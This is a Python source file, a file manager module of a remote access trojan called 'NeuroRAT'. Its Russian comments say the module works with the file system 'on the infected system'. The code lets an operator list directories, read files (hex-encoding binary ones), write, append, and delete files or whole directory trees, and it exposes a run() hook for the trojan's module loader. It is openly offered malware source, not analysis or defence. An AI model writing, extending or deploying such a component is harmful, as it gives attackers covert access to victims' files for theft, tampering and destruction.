#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
file_manager.py - NeuroRAT File Manager Module

Этот модуль предоставляет функциональность для работы с файловой системой
на инфицированной системе, включая чтение, запись, удаление файлов, 
а также получение списка файлов и директорий.
"""

import os
import json
import logging
import shutil
import platform
from datetime import datetime
from typing import Dict, List, Any, Optional

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger('file_manager')

class FileManager:
    """
    Класс для управления файловыми операциями на удаленной системе.
    Позволяет просматривать, редактировать, скачивать и загружать файлы.
    """
    
    def __init__(self, base_dir: Optional[str] = None, output_dir: Optional[str] = None):
        """
        Инициализация менеджера файлов.
        
        Args:
            base_dir: Базовая директория для работы
            output_dir: Директория для сохранения результатов
        """
        self.system = platform.system()
        self.results = {
            "module": "file_manager",
            "timestamp": datetime.now().isoformat(),
            "system": self.system,
            "summary": {
                "operations_performed": 0,
                "errors": 0
            }
        }
        
        # Определяем базовые директории по умолчанию, если не указаны
        if not base_dir:
            if self.system == "Windows":
                self.base_dir = os.environ.get("USERPROFILE", "C:\\")
            else:
                self.base_dir = os.environ.get("HOME", "/")
        else:
            self.base_dir = base_dir
            
        # Директория для вывода результатов
        self.output_dir = output_dir or os.path.join(
            os.path.dirname(os.path.abspath(__file__)), 
            "output"
        )
        
        logger.info(f"FileManager initialized on {self.system}, base_dir: {self.base_dir}")
    
    def list_directory(self, path: Optional[str] = None) -> Dict[str, Any]:
        """
        Получить список файлов и директорий в указанном пути.
        
        Args:
            path: Путь для получения списка файлов (по умолчанию - base_dir)
            
        Returns:
            Dict с информацией о содержимом директории
        """
        target_path = path or self.base_dir
        
        logger.info(f"Listing directory: {target_path}")
        self.results["summary"]["operations_performed"] += 1
        
        try:
            if not os.path.exists(target_path):
                logger.error(f"Path not found: {target_path}")
                self.results["summary"]["errors"] += 1
                return {"status": "error", "message": f"Path not found: {target_path}"}
                
            if not os.path.isdir(target_path):
                logger.error(f"Path is not a directory: {target_path}")
                self.results["summary"]["errors"] += 1
                return {"status": "error", "message": f"Path is not a directory: {target_path}"}
            
            items = []
            for item in os.listdir(target_path):
                item_path = os.path.join(target_path, item)
                item_type = "directory" if os.path.isdir(item_path) else "file"
                
                try:
                    stat = os.stat(item_path)
                    size = stat.st_size if item_type == "file" else 0
                    mod_time = datetime.fromtimestamp(stat.st_mtime).isoformat()
                except Exception as e:
                    logger.warning(f"Could not stat {item_path}: {e}")
                    size = 0
                    mod_time = None
                
                items.append({
                    "name": item,
                    "path": item_path,
                    "type": item_type,
                    "size": size,
                    "modified": mod_time
                })
            
            logger.info(f"Found {len(items)} items in {target_path}")
            return {"status": "success", "items": items, "path": target_path}
            
        except Exception as e:
            logger.error(f"Error listing directory {target_path}: {e}")
            self.results["summary"]["errors"] += 1
            return {"status": "error", "message": str(e)}
    
    def read_file(self, path: str) -> Dict[str, Any]:
        """
        Чтение содержимого файла.
        
        Args:
            path: Путь к файлу для чтения
            
        Returns:
            Dict с содержимым файла или ошибкой
        """
        logger.info(f"Reading file: {path}")
        self.results["summary"]["operations_performed"] += 1
        
        try:
            if not os.path.exists(path):
                logger.error(f"File not found: {path}")
                self.results["summary"]["errors"] += 1
                return {"status": "error", "message": f"File not found: {path}"}
                
            if not os.path.isfile(path):
                logger.error(f"Path is not a file: {path}")
                self.results["summary"]["errors"] += 1
                return {"status": "error", "message": f"Path is not a file: {path}"}
            
            # Проверяем размер файла перед чтением
            file_size = os.path.getsize(path)
            if file_size > 10 * 1024 * 1024:  # Ограничение 10 МБ
                logger.warning(f"File too large to read completely: {path} ({file_size} bytes)")
                return {"status": "error", "message": f"File too large: {file_size} bytes"}
            
            # Определяем тип файла - бинарный или текстовый
            try:
                with open(path, 'r', encoding='utf-8') as f:
                    content = f.read()
                    is_binary = False
            except UnicodeDecodeError:
                with open(path, 'rb') as f:
                    content = f.read().hex()
                    is_binary = True
            
            logger.info(f"Successfully read file: {path} ({file_size} bytes)")
            return {
                "status": "success", 
                "content": content, 
                "size": file_size,
                "is_binary": is_binary,
                "path": path
            }
            
        except Exception as e:
            logger.error(f"Error reading file {path}: {e}")
            self.results["summary"]["errors"] += 1
            return {"status": "error", "message": str(e)}
    
    def write_file(self, path: str, content: str, append: bool = False) -> Dict[str, Any]:
        """
        Запись содержимого в файл.
        
        Args:
            path: Путь к файлу для записи
            content: Содержимое для записи
            append: Если True, добавляет содержимое в конец файла
            
        Returns:
            Dict с информацией о результате операции
        """
        mode = "a" if append else "w"
        action = "Appending to" if append else "Writing"
        
        logger.info(f"{action} file: {path}")
        self.results["summary"]["operations_performed"] += 1
        
        try:
            # Убедимся, что директория существует
            directory = os.path.dirname(path)
            if directory and not os.path.exists(directory):
                os.makedirs(directory, exist_ok=True)
                logger.info(f"Created directory: {directory}")
            
            with open(path, mode) as f:
                bytes_written = f.write(content)
            
            logger.info(f"Successfully {action.lower()} {bytes_written} bytes to file: {path}")
            return {
                "status": "success", 
                "bytes_written": bytes_written,
                "path": path
            }
            
        except Exception as e:
            logger.error(f"Error {action.lower()} file {path}: {e}")
            self.results["summary"]["errors"] += 1
            return {"status": "error", "message": str(e)}
    
    def delete_file(self, path: str) -> Dict[str, Any]:
        """
        Удаление файла или директории.
        
        Args:
            path: Путь к файлу или директории для удаления
            
        Returns:
            Dict с результатом операции
        """
        logger.info(f"Deleting: {path}")
        self.results["summary"]["operations_performed"] += 1
        
        try:
            if not os.path.exists(path):
                logger.error(f"Path not found: {path}")
                self.results["summary"]["errors"] += 1
                return {"status": "error", "message": f"Path not found: {path}"}
            
            if os.path.isdir(path):
                shutil.rmtree(path)
                logger.info(f"Successfully deleted directory: {path}")
            else:
                os.remove(path)
                logger.info(f"Successfully deleted file: {path}")
            
            return {
                "status": "success", 
                "deleted": True,
                "path": path,
                "type": "directory" if os.path.isdir(path) else "file"
            }
            
        except Exception as e:
            logger.error(f"Error deleting {path}: {e}")
            self.results["summary"]["errors"] += 1
            return {"status": "error", "message": str(e)}
    
    def get_results(self) -> Dict[str, Any]:
        """
        Получить результаты работы модуля.
        
        Returns:
            Dict с результатами работы
        """
        return self.results

# Функция для запуска модуля из других модулей (ModuleLoader)
def run(action: str = "list", path: Optional[str] = None, content: Optional[str] = None, **kwargs) -> Dict[str, Any]:
    """
    Основная функция запуска для работы с файловой системой.
    
    Args:
        action: Тип операции ('list', 'read', 'write', 'delete')
        path: Путь к файлу или директории
        content: Содержимое для записи (для action='write')
        **kwargs: Дополнительные параметры
        
    Returns:
        Dict с результатами операции
    """
    file_manager = FileManager()
    
    if action == "list":
        return file_manager.list_directory(path)
    elif action == "read":
        return file_manager.read_file(path)
    elif action == "write":
        append = kwargs.get("append", False)
        return file_manager.write_file(path, content, append=append)
    elif action == "delete":
        return file_manager.delete_file(path)
    else:
        return {"status": "error", "message": f"Unsupported action: {action}"}

# Запуск в качестве самостоятельной программы
if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="NeuroRAT File Manager Module")
    parser.add_argument("action", choices=["list", "read", "write", "delete"], help="File operation type")
    parser.add_argument("path", help="Target file or directory path")
    parser.add_argument("--content", help="Content to write (for write action)")
    parser.add_argument("--append", action="store_true", help="Append to file instead of overwriting")
    
    args = parser.parse_args()
    
    result = run(action=args.action, path=args.path, content=args.content, append=args.append)
    print(json.dumps(result, indent=2)) 